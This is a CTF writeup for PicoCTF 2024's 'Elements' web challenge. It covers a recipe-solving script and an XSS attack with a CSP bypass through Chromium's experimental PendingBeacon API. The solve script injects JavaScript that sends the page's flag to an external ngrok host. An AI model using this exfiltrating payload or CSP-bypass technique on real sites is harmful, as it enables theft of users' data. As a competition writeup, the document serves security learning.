---
title: "PicoCTF 2024 Elements Writeup"
date: 2024-04-09T17:34:41+08:00
description: "Solution for PicoCTF 2024's least solved web challenge: Elements"
---

We got ranked #10 globally in PicoCTF 2024!

## Elements

This problem is essentially an XSS + CSP bypass.
The XSS part was easy: we need to construct a dependency tree to build the `XSS` element.
For this, I used topological sorting.

```python
import graphlib
recipies = [["Ash","Fire","Charcoal"],["Steam Engine","Water","Vapor"],["Brick Oven","Heat Engine","Oven"],["Steam Engine","Swamp","Sauna"],["Magma","Mud","Obsidian"],["Earth","Mud","Clay"],["Volcano","Water","Volcanic Rock"],["Brick","Fog","Cloud"],["Obsidian","Rain","Black Rain"],["Colorful Pattern","Fire","Rainbow Fire"],["Cloud","Obsidian","Storm"],["Ash","Obsidian","Volcanic Glass"],["Electricity","Haze","Static"],["Fire","Water","Steam"],["Dust","Rainbow","Powder"],["Computer Chip","Steam Engine","Artificial Intelligence"],["Fire","Mud","Brick"],["Hot Spring","Swamp","Sulfur"],["Adobe","Graphic Design","Web Design"],["Colorful Interface","Data","Visualization"],["IoT","Security","Encryption"],["Colorful Pattern","Mosaic","Patterned Design"],["Earth","Steam Engine","Excavator"],["Cloud Computing","Data","Data Mining"],["Earth","Water","Mud"],["Brick","Fire","Brick Oven"],["Colorful Pattern","Obsidian","Art"],["Rain","Steam Engine","Hydropower"],["Colorful Display","Graphic Design","Colorful Interface"],["Fire","Mist","Fog"],["Exploit","Web Design","XSS"],["Computer Chip","Hot Spring","Smart Thermostat"],["Earth","Fire","Magma"],["Air","Earth","Dust"],["Cloud","Rainbow","Rainbow Cloud"],["Dust","Heat Engine","Sand"],["Obsidian","Thunderstorm","Lightning Conductor"],["Cloud","Rain","Thunderstorm"],["Adobe","Cloud","Software"],["Hot Spring","Rainbow","Colorful Steam"],["Dust","Fire","Ash"],["Cement","Swamp","Marsh"],["Hot Tub","Mud","Mud Bath"],["Electricity","Glass","Computer Chip"],["Ceramic","Fire","Earthenware"],["Haze","Swamp","Fog Machine"],["Rain","Rainbow","Colorful Display"],["Brick","Water","Cement"],["Dust","Haze","Sandstorm"],["Ash","Hot Spring","Geothermal Energy"],["Ash Rock","Heat Engine","Mineral"],["Electricity","Software","Program"],["Computer Chip","Fire","Data"],["Colorful Pattern","Swamp","Algae"],["Fog","Water","Rain"],["Rainbow Pool","Reflection","Color Spectrum"],["Artificial Intelligence","Data","Encryption"],["Internet","Smart Thermostat","IoT"],["Cinder","Heat Engine","Ash Rock"],["Brick","Swamp","Mudbrick"],["Computer Chip","Volcano","Data Mining"],["Obsidian","Water","Hot Spring"],["Computer Chip","Thunderstorm","Power Surge"],["Brick","Obsidian","Paving Stone"],["User Input","Visualization","Interactive Design"],["Mist","Mud","Swamp"],["Geolocation","Wall","Map"],["Air","Rock","Internet"],["Computer Chip","Rain","Email"],["Fire","Rainbow","Colorful Flames"],["Hot Spring","Mineral Spring","Healing Water"],["Ceramic","Volcano","Lava Lamp"],["Brick Oven","Wall","Fireplace"],["Glass","Software","Vulnerability"],["Fog","Mud","Sludge"],["Fire","Marsh","S'mores"],["Artificial Intelligence","Data Mining","Machine Learning"],["Ash","Brick","Brick Kiln"],["Fire","Obsidian","Heat Resistant Material"],["Hot Spring","Sludge","Steam Engine"],["Artificial Intelligence","Computer Chip","Smart Device"],["Fire","Steam Engine","Heat Engine"],["Ash","Earth","Cinder"],["Rainbow","Reflection","Refraction"],["Encryption","Software","Cybersecurity"],["Graphic Design","Mosaic","Artwork"],["Colorful Display","Data Mining","Visualization"],["Hot Spring","Water","Mineral Spring"],["Rainbow","Swamp","Reflection"],["Air","Fire","Smoke"],["Program","Smart HVAC System","Smart Thermostat"],["Haze","Obsidian","Blackout"],["Brick","Earth","Wall"],["Heat Engine","Steam Locomotive","Railway Engine"],["Ash","Thunderstorm","Volcanic Lightning"],["Mud","Water","Silt"],["Colorful Pattern","Hot Spring","Rainbow Pool"],["Fire","Sand","Glass"],["Art","Web Design","Graphic Design"],["Internet","Machine Learning","Smart HVAC System"],["Electricity","Power Surge","Overload"],["Colorful Pattern","Computer Chip","Graphic Design"],["Air","Water","Mist"],["Brick Oven","Cement","Concrete"],["Artificial Intelligence","Cloud","Cloud Computing"],["Computer Chip","Earth","Geolocation"],["Color Spectrum","Graphic Design","Colorful Interface"],["Internet","Program","Web Design"],["Computer Chip","Overload","Circuit Failure"],["Data Mining","Geolocation","Location Tracking"],["Heat Engine","Smart Thermostat","Smart HVAC System"],["Brick","Mud","Adobe"],["Cloud","Dust","Rainbow"],["Hot Spring","Obsidian","Hot Tub"],["Steam Engine","Volcano","Geothermal Power Plant"],["Earth","Fog","Haze"],["Brick","Steam Engine","Steam Locomotive"],["Brick","Colorful Pattern","Mosaic"],["Hot Spring","Steam Engine","Electricity"],["Ash","Volcano","Volcanic Ash"],["Electricity","Water","Hydroelectric Power"],["Brick","Rainbow","Colorful Pattern"],["Silt","Volcano","Lava"],["Computer Chip","Software","Program"],["Hot Spring","Thunderstorm","Lightning"],["Ash","Clay","Ceramic"],["Cybersecurity","Vulnerability","Exploit"],["Ash","Heat Engine","Ash Residue"],["Internet","Smart Device","Cloud Computing"],["Magma","Mist","Rock"],["Interactive Design","Program","Smart Device"],["Computer Chip","Electricity","Software"],["Colorful Pattern","Graphic Design","Design Template"],["Fire","Magma","Volcano"],["Earth","Obsidian","Computer Chip"],["Geolocation","Location Tracking","Real-Time Positioning"]]

orig = ['Fire', 'Water', 'Earth', 'Air']

dependencies = {}
for r in recipies:
    dependencies[r[2]] = [r[0], r[1]]

dep_set = set()
dep_graph = {}

def trace_dependency(dep, level = 0):
    if dep in dep_set:
        return
    if dep in dependencies:
        dep_graph[dep] = set(dependencies[dep])
        for d in dependencies[dep]:
            if d in orig:
                continue
            trace_dependency(d, level+1)

trace_dependency("XSS")

ts = graphlib.TopologicalSorter(dep_graph)
res_order = list(ts.static_order())

res_lst = [dependencies[k] for k in res_order if k in dependencies]
print(res_lst)
# [['Earth', 'Fire'], ['Earth', 'Water'], ['Air', 'Water'], ['Air', 'Earth'], ['Magma', 'Mud'], ['Fire', 'Mist'], ['Magma', 'Mist'], ['Earth', 'Obsidian'], ['Obsidian', 'Water'], ['Fog', 'Mud'], ['Air', 'Rock'], ['Computer Chip', 'Fire'], ['Hot Spring', 'Sludge'], ['Computer Chip', 'Steam Engine'], ['Hot Spring', 'Steam Engine'], ['Fire', 'Steam Engine'], ['Artificial Intelligence', 'Data'], ['Computer Chip', 'Electricity'], ['Dust', 'Heat Engine'], ['Encryption', 'Software'], ['Computer Chip', 'Software'], ['Fire', 'Sand'], ['Internet', 'Program'], ['Glass', 'Software'], ['Cybersecurity', 'Vulnerability'], ['Exploit', 'Web Design']]
```

The CSP part is tricky.
In the browser, all HTTP based apis (`fetch`, `XMLHttpRequest`, etc) adheres to the CSP policy that allows nothing.
Additionally, chromium was modified by the organizers to not expose WebRTC, which is a common way to bypass CSP.
DNS pre-fetching is also blocked due to `network_prediction_options: 2`.

However, note that the flag `--enable-experimental-web-platform-features` was turned on.
This enables a myriad of experimental features that are not yet standardized or documented.
To find a list of experimental features enabled, I looked at all the `status: "experimental"` [this](https://chromium.googlesource.com/chromium/src/+/891de733b481fff05ae0d07658b8e3bd4b622a6e/third_party/blink/renderer/platform/runtime_enabled_features.json5) file.
I found a suspicious-sounding feature [PendingBeacon](https://chromestatus.com/feature/5690553554436096).
Turns out that this does not respect CSP and can be used to send arbitrary requests.
After finding this, we can use any external server to exfiltrate the flag.

Note: PendingBeacon is now deprecated, and was replaced by the [fetchLater](https://chromestatus.com/feature/4654499737632768) API, alas.

Solve Script:

```python
import requests
import json
import base64

js_code = """
let pb = new PendingGetBeacon(`https://e6f8-2400-8901-00-f03c-94ff-fe8e-5147.ngrok-free.app/${state.flag}`);
pb.sendNow();
"""

API_PATH = "http://rhea.picoctf.net:58802"
payload = {
    "xss": js_code,
    "recipe": [['Earth', 'Fire'], ['Earth', 'Water'], ['Air', 'Water'], ['Air', 'Earth'], ['Magma', 'Mud'], ['Fire', 'Mist'], ['Magma', 'Mist'], ['Earth', 'Obsidian'], ['Obsidian', 'Water'], ['Fog', 'Mud'], ['Air', 'Rock'], ['Computer Chip', 'Fire'], ['Hot Spring', 'Sludge'], ['Computer Chip', 'Steam Engine'], ['Hot Spring', 'Steam Engine'], ['Fire', 'Steam Engine'], ['Artificial Intelligence', 'Data'], ['Computer Chip', 'Electricity'], ['Dust', 'Heat Engine'], ['Encryption', 'Software'], ['Computer Chip', 'Software'], ['Fire', 'Sand'], ['Internet', 'Program'], ['Glass', 'Software'], ['Cybersecurity', 'Vulnerability'], ['Exploit', 'Web Design']]
}

print(base64.b64encode(json.dumps(payload).encode()).decode())

r = requests.post(f"{API_PATH}/remoteCraft", params={'recipe': json.dumps(payload)})

print(r.text)
```
